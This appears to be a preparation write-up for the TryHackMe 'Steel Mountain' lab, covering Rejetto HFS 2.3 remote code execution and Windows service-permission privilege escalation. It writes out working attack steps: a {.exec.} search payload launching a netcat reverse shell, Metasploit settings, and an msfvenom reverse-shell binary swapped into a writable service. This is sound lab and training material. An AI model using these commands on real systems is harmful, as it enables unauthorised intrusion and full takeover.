# Steel Mountain — TryHackMe

> **Preparation stub.** Based on publicly documented information about this retired room — not an
> original solve, and no live flag values are recorded. Complete the bracketed fields when working
> the room under your own account. Only document legally authorised activity.

## Engagement metadata

| Field | Value |
|-------|-------|
| Platform | TryHackMe |
| Room | Steel Mountain |
| Difficulty | Easy–Medium |
| Category | Windows |
| Target IP | 10.x.x.x (lab-assigned) |
| Date completed | [YYYY-MM-DD] |

## Executive summary

A Windows server running **Rejetto HttpFileServer (HFS) 2.3**, vulnerable to unauthenticated remote
code execution. Exploitation gives a user shell; privilege escalation abuses an **insecure Windows
service** (identified with PowerUp) to run a malicious binary as SYSTEM. Teaches Windows
service-misconfiguration privesc, and the room is designed to be solved both with and without
Metasploit.

## Scenario value (study scaffold)

- **What it tests:** mapping a service banner (Rejetto HFS 2.3) to a known CVE, and Windows
  service-misconfiguration privilege escalation.
- **What completing it demonstrates:** both the Metasploit *and* the manual `{.exec.}` exploitation
  paths, plus PowerUp-driven privesc on an insecure/writable service binary (MITRE T1190 → T1543.003
  / T1574.009) — the room is explicitly designed to be solved both ways.

## Key vulnerability class

- **Foothold:** Rejetto **HFS 2.3** RCE via the `{.exec.}` macro in the search parameter —
  **CVE-2014-6287**. *Verify CVE when citing.*
- **Privesc:** insecure Windows **service** — commonly the bundled `AdvancedSystemCareService9`
  (Advanced SystemCare) with a **writable binary path** (and/or **unquoted service path**),
  exploitable by replacing the service executable and restarting it (CWE-732 / CWE-428 unquoted
  search path).

## 1. Reconnaissance

```
nmap -sC -sV -p- -oA nmap/steelmountain 10.x.x.x
```

Expected exposed surface (confirm on completion):

| Port | Service | Note |
|------|---------|------|
| 80/tcp | http (IIS) | Landing page — image reveals an employee-of-the-month name (room hint) |
| 8080/tcp | http | **HttpFileServer 2.3 — the foothold** |
| 3389/tcp | ms-wbt-server | RDP |
| 135/139/445 | msrpc/smb | Windows services |

- Browse `:8080` and confirm the banner reads **"HttpFileServer 2.3"**. [Paste scan output on
  completion.]

## 2. Exploitation (HFS 2.3 RCE)

**Manual path (recommended for understanding):** host a Netcat binary and a payload over a Python
web server, then trigger the `{.exec.}` macro to download and run it.

```
# attacker box
python3 -m http.server 80          # serve nc.exe
nc -lvnp 4444                       # catch the shell

# trigger via the HFS search field (URL-encoded {.exec.} payload), e.g.
#   /?search=%00{.exec|c%3A%5CWindows%5CTemp%5Cnc.exe -e cmd.exe <tun0 ip> 4444.}
```

**Metasploit path:**

```
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.x.x.x
set RPORT 8080
set LHOST <tun0 ip>
exploit
```

- **User flag:** `[capture on completion]`

## 3. Privilege escalation (insecure service)

```powershell
# upload and run PowerUp
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
```

- PowerUp flags a service whose executable path is **writable by the current user** (and/or
  unquoted) — typically `AdvancedSystemCareService9`. Confirm with native tools:

```
sc qc AdvancedSystemCareService9          # inspect BINARY_PATH_NAME
accesschk.exe -wuvc AdvancedSystemCareService9
```

- Generate a replacement binary, overwrite the service executable, and restart the service so it
  runs the payload as **SYSTEM**:

```
msfvenom -p windows/shell_reverse_tcp LHOST=<tun0 ip> LPORT=5555 -f exe -o ASCService.exe
# upload over the writable path, then:
sc stop  AdvancedSystemCareService9
sc start AdvancedSystemCareService9       # service runs as SYSTEM → payload fires
```

- **Root/admin flag:** `[capture on completion]`

## 4. Tools used

| Phase | Tools |
|-------|-------|
| Recon | `nmap` (`-sC -sV -p-`) |
| Exploitation | Metasploit (`rejetto_hfs_exec`) **or** manual `{.exec.}` payload + `nc` + `python3 -m http.server` |
| Privesc enumeration | **PowerUp.ps1** (PowerSploit), `sc qc`, `accesschk` |
| Privesc exploitation | `msfvenom` (payload), `sc stop/start` |

## 5. MITRE ATT&CK mapping

| Tactic | Technique | ID |
|--------|-----------|-----|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Command and Scripting Interpreter | T1059 |
| Privilege Escalation | Create or Modify System Process: Windows Service | T1543.003 |
| Privilege Escalation | Hijack Execution Flow: Unquoted Path | T1574.009 |

## 6. Key learnings

- **Service-binary permissions are a top Windows privesc vector** — if a low-priv user can write the
  service's executable (or exploit an unquoted path), they can run code as SYSTEM on restart.
- **PowerUp/winPEAS pay for themselves** — automated checks surface writable services, unquoted
  paths, and `AlwaysInstallElevated` quickly; always verify a flagged finding with `sc qc` +
  `accesschk` before acting.
- **Know both routes** — Metasploit *and* a manual `{.exec.}` payload; the manual path builds
  understanding and works when Metasploit is disallowed (the room's second task explicitly asks for
  the manual solve).
- **Blue-team transfer:** MITRE **T1574.009** (unquoted path) / **T1543.003** (Windows service);
  detect via service-binary modification and unexpected service restarts. Control: restrict write
  permissions on service binaries and quote all service paths.

## 7. References

- Rejetto HFS 2.3 CVE-2014-6287 (verify before citing).
- PowerSploit / PowerUp documentation; unquoted-service-path guidance.
